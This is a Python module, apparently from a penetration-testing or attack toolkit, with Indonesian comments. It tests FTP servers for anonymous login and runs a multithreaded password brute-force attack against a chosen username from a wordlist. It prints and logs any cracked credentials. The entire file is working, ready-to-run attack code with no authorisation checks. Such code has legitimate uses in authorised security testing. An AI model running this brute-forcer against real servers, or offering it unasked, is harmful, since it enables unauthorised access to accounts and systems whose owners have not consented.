#!/usr/bin/env python3
import ftplib
import threading
from queue import Queue, Empty

from config.var import var


# FIX: ftplib.all_errors mencakup error koneksi & auth; dipakai konsisten
def check_anonymous(hostname, verbose=False):
    """Check for anonymous FTP login."""
    log_file = var.log
    ftp = None
    try:
        ftp = ftplib.FTP(hostname, timeout=10)
        ftp.login()  # anonymous login (user 'anonymous', pass kosong)
        if verbose:
            print(f"[+] Anonymous login accepted on {hostname}, listing files...")
            ftp.retrlines("LIST")
        print("[!] Anonymous login successful!")
        with open(log_file, "a") as filelog:
            filelog.write(f"[!] Anonymous login successful on {hostname}!\n")
    except ftplib.all_errors as e:
        print("[-] Anonymous login unsuccessful")
        if verbose:
            print(f"[DEBUG] {type(e).__name__}: {e}")
        with open(log_file, "a") as filelog:
            filelog.write(f"[-] Anonymous login unsuccessful on {hostname}\n")
    finally:
        # FIX: pastikan koneksi ditutup walau exception
        if ftp is not None:
            try:
                ftp.quit()
            except ftplib.all_errors:
                try:
                    ftp.close()
                except Exception:
                    pass


def brute_force(hostname, username, wordlist, verbose=False):
    """Brute force FTP login."""
    log_file = var.log
    try:
        with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[!] Error: Wordlist not found")
        return

    if not passwords:
        print("[!] Wordlist is empty")
        return

    print(f"[+] Loaded {len(passwords)} passwords")
    print(f"[+] Server: {hostname}")
    print(f"[+] User: {username}")

    queue = Queue()
    threads = []

    # FIX: flag thread-safe untuk stop semua worker saat password ketemu
    stop_event = threading.Event()
    found_lock = threading.Lock()
    found = {"password": None}

    def worker():
        while not stop_event.is_set():
            # FIX: hindari race queue.empty() vs get()
            try:
                password = queue.get(timeout=1)
            except Empty:
                break

            try:
                if stop_event.is_set():
                    break

                if verbose:
                    print(f"[?] Trying: {password}")

                ftp = None
                try:
                    ftp = ftplib.FTP(hostname, timeout=10)
                    ftp.login(username, password)
                    # FIX: jangan retrlines di sini (boros & bisa lambat).
                    # Cukup login sukses sebagai indikator.
                    with found_lock:
                        if found["password"] is None:
                            found["password"] = password
                            print(f"\n[!] Login Success! Username: {username} Password: {password}")
                            with open(log_file, "a") as filelog:
                                filelog.write(
                                    f"\n[!] Login Success! Username: {username} "
                                    f"Password: {password}\n"
                                )
                    # FIX: set event agar semua thread berhenti (bukan queue.clear())
                    stop_event.set()
                except ftplib.all_errors as e:
                    if verbose:
                        print(f"[-] Failed: {password} ({type(e).__name__})")
                finally:
                    if ftp is not None:
                        try:
                            ftp.quit()
                        except ftplib.all_errors:
                            try:
                                ftp.close()
                            except Exception:
                                pass
            finally:
                queue.task_done()

    for password in passwords:
        queue.put(password)

    # FIX: thread_count tidak melebihi jumlah password, minimal 1
    thread_count = min(10, len(passwords))
    for _ in range(thread_count):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    if found["password"] is None:
        print("[-] Brute force finished. No valid password found.")
    else:
        print(f"[+] Brute force finished. Password found: {found['password']}")